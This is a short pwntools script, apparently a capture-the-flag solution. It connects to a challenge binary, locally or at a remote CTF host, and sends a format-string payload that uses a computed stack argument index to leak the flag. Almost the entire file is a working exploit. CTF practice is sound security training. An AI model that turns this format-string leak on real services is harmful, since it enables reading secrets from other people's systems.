#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe

def conn():
    if args.LOCAL:
        #r = gdb.debug([exe.path])
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("tjc.tf", 31258)

    return r


def main():
    r = conn()

    flag_argno = int(6 + (0xc0-0xa0)/8)

    r.sendlineafter(b'> ', f'%{flag_argno}$s'.encode())

    while True:
        print(r.recvline())

    r.interactive()


if __name__ == "__main__":
    main()
